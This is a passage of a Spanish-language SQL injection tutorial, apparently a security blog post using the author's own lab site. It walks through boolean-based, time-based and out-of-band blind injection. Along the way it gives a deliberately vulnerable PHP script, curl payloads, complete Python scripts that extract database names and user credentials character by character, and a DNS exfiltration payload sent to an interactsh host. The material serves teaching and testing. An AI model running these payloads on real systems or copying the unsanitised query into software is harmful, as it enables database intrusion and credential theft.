Antes de explicar nada, vamos a modificar el script de la aplicación web para que no muestre ninguna información. Además, incluiremos una línea adicional que nos indicará si la consulta se ejecutó correctamente, lo que nos permitirá realizar la inyección booleana.

```php
<?php
  $server = "localhost";
  $username = "pr1ngl3s";
  $password = "pringles123";
  $database = "gamesdb";

  // Creamos una nueva conexión a la base de datos utilizando MySQLi
  $conn = new mysqli($server, $username, $password, $database);


  // Verificamos si se ha proporcionado un parámetro 'id' a través de la URL
  $id = $_GET['id'];

  // Realizamos un consulta SQL para obtener el nombre del articulo  y su fecha de lanzamiento correspondiente al ID y manejar cualquier error en caso de que ocurra
  $query = mysqli_query($conn, "SELECT games,release_date FROM games WHERE id='$id'") or die(mysqli_error($conn));

  // Obtenemos el resultado de la consulta
  $response = mysqli_fetch_array($query);

  // echo "Juego: " . $response['games'] . "<br><br>";
  // echo "Fecha de lanzamiento: " . $response['release_date'];

  // Si se encontra algún producto correspondiente al ID proporcionado
  if(isset($response['games'])) {
      // Mostramos un mensaje indicando que el producto fue encontrado
      echo "Producto encontrado";
  }
?>
```

Si accedemos a la pagina solo nos mostrara un mensaje en caso de que el producto exista.

![img](/assets/img/sqli/message_boolean.png)

Ahora bien al añadir la siguiente sentencia de `'or 1=1-- -` no pasa nada ya que la sentencia final es `TRUE`.

![img](/assets/img/sqli/boolean_1=1.png)

Sin embargo, al insertar una condición incorrecta como `'or 2=1-- -`, al ser el numero 2 diferente al numero 1, ya no muestra el mensaje devido a que la sentencia final es `FALSE`.

![img](/assets/img/sqli/boolean_2=1.png)


No solo funcionaria con numeros, tambien con letras y otros carácteres.

![img](/assets/img/sqli/boolean_'a'='a'.png)

![img](/assets/img/sqli/boolean_'b'='a'.png)

Por lo tanto, utilizando esa lógica booleana que determina si una condición es verdadera o falsa, podemos obtener toda la información de la base de datos carácter por carácter.

Con la función `SUBSTR()`, podemos ejecutar tanto una sentencia SQL como una función y limitar el resultado a un solo carácter, siendo la estructura que utilizaremos tal que así `SUBSTR([FUNCIÓN O SENTENCIA SQL],[POSICIÓN DEL CARÁCTER],[CANTIDAD])="[CARÁCTER A COMPARAR]"`.

Digamos que queremos saber primero el nombre de la base de datos, para ello simplemente le añadimos la siguiente condición: el primer carácter de la base de datos es igual a la letra '**a**' `9' OR SUBSTR(database(),1,1)="a"`, en caso de que sea errona, que lo es, no nos mostrara el mensaje.

![img](/assets/img/sqli/database()='a'.png)

De la misma manera, si lo igualamos a la letra que si que es igual al de la primera posición de la base de datos, en este caso la letra '**g**' `9' OR SUBSTR(database(),1,1)="g"` si que nos muestra el mensaje.

![img](/assets/img/sqli/database()='g'.png)

Ya con este metodo podremos aberiguar el nombre de la base de datos, cambiando  a necesidad la posición del carácter a adivinar.

```bash
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),1,1)='g'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),2,1)='a'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),3,1)='m'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),4,1)='e'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),5,1)='s'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),6,1)='d'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),7,1)='b'-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or substr(database(),1,7)='gamesdb'-- -"; echo
Producto encontrado
```

Con esta parte ya explicada, ya tenemos una idea de cómo podemos descubrir la información que contiene la base de datos.

Sin embargo, por razones lógicas, no vamos a estar adivinando carácteres manualmente. Es por ello que mediante un script automatizaremos este tipo de inyecciones.

```python
#!/usr/bin/python3
import requests


# Global variables
main_url = "http://192.168.6.5/searchgames.php"

minus = "abcdefghijklmnopqrstuvwxyz"
mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
symbols = "!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
numbers = "0123456789"

characters = minus + mayus + symbols + numbers

def make_SQLi():
  string = ""

  for position in range(1,8):
    for character in characters:
      sqli = main_url + "?id=9'OR SUBSTR(database(),%d,1)='%s'-- -" % (position,character)

      r = requests.get(sqli)

      if "Producto encontrado" in r.text:
        string+=character
        print(f"El carácter de la posición {position} es: {character}")
        break

  return string

if __name__ == "__main__":
	string = make_SQLi()
	print(f"La información es: {string}")
```
Quedando el resultado tal que así:

![img](/assets/img/sqli/script_boolean1.png)

Ahora vamos a adivinar la información de la base de datos, pero para no estar repetiendo lo mismo que anteriormente, nos saltaremos la parte del descubrimiento de las bases de datos, las tablas y las columnas (ya que el concepto es exactamente el mismo), para ir directamente a los datos de las columnas `username` y `password`.

Pero lo normal es que no se sepa la longitud de los datos a recolectar, es por ello que para un trabajo más óptimo utilizaremos la función `LENGTH()` para adivinar la longitud.

La logica seria la misma que con la función `SUBSTR()`, pero en este caso, ir adivinando la longitud exacta.

```bash
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='1'-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='2'-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='3'-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='4'-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='5'-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='6'-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or length(database())='7'-- -"; echo
Producto encontrado
```

Por lo que el script quedaria de la siguiente forma: 

```python
#!/usr/bin/python3
import requests
from pwn import log
import time

# Global variables
main_url = "http://192.168.6.5/searchgames.php"

minus = "abcdefghijklmnopqrstuvwxyz"
mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
symbols = "!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
numbers = "0123456789"

characters = minus + mayus + symbols + numbers

def make_SQLi():
  string = ""

  length = 1

  # Adivinamos la longitud de los datos a recolectar
  while True:
    sqli = main_url + "?id=9'OR length(database())='%d'-- -" % (length)

    r = requests.get(sqli)

    if "Producto encontrado" in r.text:
      break
    length+=1
  for position in range(1,length+1):
    for character in characters:
      sqli = main_url + "?id=9'OR SUBSTR(database(),%d,1)='%s'-- -" % (position,character)

      r = requests.get(sqli)

      if "Producto encontrado" in r.text:
        string+=character
        print(f"El carácter de la posición {position} es: {character}")
        break

	return string

if __name__ == "__main__":
  string = make_SQLi()
  print(f"La información es: {string}")

```


Simplemente para querer enumerar otros datos, cambiamos la query del script y ya:

![img](/assets/img/sqli/script_boolean2.png)

Y con ese cambio ya podemos ver los datos que queremos.

![img](/assets/img/sqli/script_boolean3.png)


Pero hay un problema, y es que como vemos, los datos no son del todo verdaderos ya que los datos originales tiene algunos carácteres en mayuscula.

```sql
MariaDB [gamesdb]> select * from users where id='3';
+------+-------------+----------+
| id   | username    | password |
+------+-------------+----------+
|    3 | R_J04qu1n_R | R0j0_123 |
+------+-------------+----------+
1 row in set (0,000 sec)
```

Esto se debe a que es case-insensitive (no diferencia entre mayúsculas y minúsculas).

```bash
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or 'A'='a'-- -"; echo
Producto encontrado
```

No obstante si pasamos los carácteres a decimal con la función `ASCII()`, podemos ver que ahora si que puede diferenciarlos.

```bash
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or ASCII('A')=ASCII('a')-- -"; echo

❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or ASCII('A')=ASCII('A')-- -"; echo
Producto encontrado
❯ curl -s -X GET "http://192.168.6.5/searchgames.php" -G --data-urlencode "id=9'or ASCII('A')=65-- -"; echo
Producto encontrado
```
Por lo tanto, esta sería una manera de eludir, entre comillas, esa restricción que teníamos con las minúsculas y mayúsculas.

![img](/assets/img/sqli/script_boolean4.png)

![img](/assets/img/sqli/script_boolean5.png)


### Time-based

Para esta y ultima inyección de tipo blind modificaremos de nuevo el script de la aplicación web, para que ahora no nos muestre absolutamente nada.

```php
<?php
  $server = "localhost";
  $username = "pr1ngl3s";
  $password = "pringles123";
  $database = "gamesdb";


  // Creamos una nueva conexión a la base de datos utilizando MySQLi
  $conn = new mysqli($server, $username, $password, $database);

  // Verificamos si se ha proporcionado un parámetro 'id' a través de la URL
  $id = $_GET['id'];

  // Realizamos un consulta SQL para obtener el nombre del articulo  y su fecha de lanzamiento correspondiente al ID y manejar cualquier error en caso de que ocurra
  $query = mysqli_query($conn, "SELECT games,release_date FROM games WHERE id='$id'") or die(mysqli_error($conn));

  // Obtenemos el resultado de la consulta
  $response = mysqli_fetch_array($query);

  // echo "Juego: " . $response['games'] . "<br><br>";
  // echo "Fecha de lanzamiento: " . $response['release_date'];

  // if(isset($response['games'])) {
    // echo "Producto encontrado";
?>
```

Ahora, al acceder a la página, ya no se muestra ningún tipo de mensaje ni cambio que pueda ayudarnos a adivinar la información de la base de datos.

![img](/assets/img/sqli/time1.png)

Pareciera que ya no hay forma de obtener la información de la base de datos, pero no es así ya que podemos utilizar la función `SLEEP()` la cual como ya podemos intuir realiza una pausa de los segundos que nosotros le indiquemos.

```sql
MariaDB [(none)]> select sleep(5);
+----------+
| sleep(5) |
+----------+
|        0 |
+----------+
1 row in set (5,004 sec)
```
Utilizaremos la función `IF()` junto con `SLEEP()` para crear la siguiente estructura: si la condición se cumple, entonces se ejecutará una acción, en caso contrario, se ejecutará otra acción. `IF([CONDICIÓN],[SI SE CUMPLE LA CONDICIÓN, EJECUTAME ESTO],[SI NO SE CUMPLE LA CONDICIÓN,EJECUTAME ESTO])`.

```sql
MariaDB [gamesdb]> select games,release_date from games where id='1'and IF('a'='a',sleep(5),1);-- -';
Empty set (5,010 sec)

MariaDB [gamesdb]> select games,release_date from games where id='1'and IF('b'='a',sleep(5),1);-- -';
+----------+--------------+
| games    | release_date |
+----------+--------------+
| Warframe | 2013-03-25   |
+----------+--------------+
1 row in set (0,000 sec)
```

En este caso, le estamos indicando que el primer carácter de la base de datos es igual a la letra '**g**', y al ser la condición cierta realiza la espera de 5 segundos.

```sql
MariaDB [gamesdb]> select games,release_date from games where id='1'and IF(SUBSTR(database(),1,1)='g',sleep(5),1);-- -';
Empty set (5,001 sec)
```


Pero en este caso, al no cumplirse esta condición, no realiza esa espera de 5 segundos, dado que el segundo carácter de la base de datos no es la letra '**g**'.


```sql
MariaDB [gamesdb]> select games,release_date from games where id='1'and IF(SUBSTR(database(),2,1)='g',sleep(5),1);-- -';
+----------+--------------+
| games    | release_date |
+----------+--------------+
| Warframe | 2013-03-25   |
+----------+--------------+
1 row in set (0,000 sec)
```

Con esto en mente, podemos aplicarlo al script que hemos creado para el boolean-based.

```python
#!/usr/bin/python3
import requests
from pwn import log
import time

# Global variables
main_url = "http://192.168.6.5/searchgames.php"

minus = "abcdefghijklmnopqrstuvwxyz"
mayus = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
symbols = "!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
numbers = "0123456789"

characters = minus + mayus + symbols + numbers

def make_SQLi():
	string = ""

	length = 1

	# Adivinamos la longitud de los datos a recolectar

	while True:
		sqli = main_url + "?id=1'AND IF(length(database())='%d',sleep(5),1)-- -" % (length)

		time_start = time.time()

		r = requests.get(sqli)

		time_end = time.time()

		if time_end - time_start >= 5:
			break

		length+=1

	for position in range(1,length+1):
		for character in characters:
			sqli = main_url + "?id=1'AND IF(SUBSTR(database(),%d,1)='%s',sleep(5),1)-- -" % (position,character)

			time_start = time.time()

			r = requests.get(sqli)

			time_end = time.time()

			if time_end - time_start >=5:
				string+=character
				print(f"El carácter de la posición {position} es: {character}")
				break

	return string

if __name__ == "__main__":
  string = make_SQLi()
  print(f"La información es: {string}")
```

Dado que estamos realizando una espera de 5 segundos por cada carácter, no es de extrañar que tardemos más en visualizar la respuesta.

![img](/assets/img/sqli/script_time1.png)

![img](/assets/img/sqli/script_time2.png)


Para querer visualizar la información que queremos de la base de datos, simplemente cambiamos la consulta del script.

![img](/assets/img/sqli/script_time3.png)

![img](/assets/img/sqli/script_time4.png)


## Out-of-band

Para concluir con los tipos de inyecciones, abordaremos la inyección **O**ut-**O**f-**B**and (OOB), la cual se realiza cuando no tenemos la capacidad de conseguir la salida de la consulta de ninguna forma, pero tenemos la capacidad de realizar peticiones DNS, HTTP(S) etc.

El primer paso para explotar una inyección SQL OOB es verificar que la variable `secure_file_priv` esté deshabilitada.

El segundo paso seria poder de alguna forma, interceptar las peticiónes que mandaremos a través de consultas HTTP(S) o DNS, en este caso utilizaremos la herramienta `interactsh`, que se encuentra en siguiente repositorio de [GitHub](https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#interactsh-client), junto con un [video](https://www.youtube.com/watch?v=p-N56aR4Omw) donde se explica el uso de este.

```shell
    _       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

		projectdiscovery.io

[INF] Current interactsh version 1.1.9 (latest)
[INF] Listing 1 payload for OOB Testing
[INF] co6pf7mi3i5gddf22uo0bgeayc9z7g8d1.oast.live
```

Al iniciar la herramienta nos proporcionará un dominio `co6pf7mi3i5gddf22uo0bgeayc9z7g8d1.oast.live`, el cual tendremos que enviar con la petición.

En el siguiente [estudio](https://zenodo.org/records/3556347#.XeDK1tURVPY) se abarcan las diferentes formas de realizar la inyección dependiendo del gestor de base de datos en uso.

En este caso averiguaremos la versión, el usuario que esta conectado a la base de datos y el nombre de la base de datos en uso, con la siguiente sintaxis: `1'union select load_file(CONCAT('\\\\',(SELECT @@version),'.',(SELECT user()),'.',(SELECT database()),'.','co6pf7mi3i5gddf22uo0bgeayc9z7g8d1.oast.live\\vfw')),2-- -`.

```shell
[10.5.21-MariaDB-0+deb11u1.pr1ngl3s@localhost.gamesdb.co6pf7mi3i5gddf22uo0bgeayc9z7g8d1] Received DNS interaction (AAAA) from 91.126.224.37 at 2024-04-16 08:30:36
```

Al enviar la petición DNS el cual contiene de subdominios la respuesta de las consultas SELECT, vemos la versión, el usuario y el nombre de la base de datos. 

De esta forma hemos logrado la obtención de información de la base de datos, fuera del canal de comunicación principal.

## Conclusión

Hemos cubierto desde lo más básico hasta los tipos de inyecciones SQL. Lo que nos ha proporcionado el conocimiento necesario para comprender y llevar a cabo estas técnicas.

Sin embargo, es importante destacar que no siempre se aplicarán las mismas técnicas de inyección. Cada tipo de inyección tiene sus particularidades, por lo que será necesario investigar formas de eludir las múltiples técnicas de sanitización que puedan existir.

Con todo esto explicado, estamos mejor preparados para abordar los desafíos relacionados con la seguridad en bases de datos.


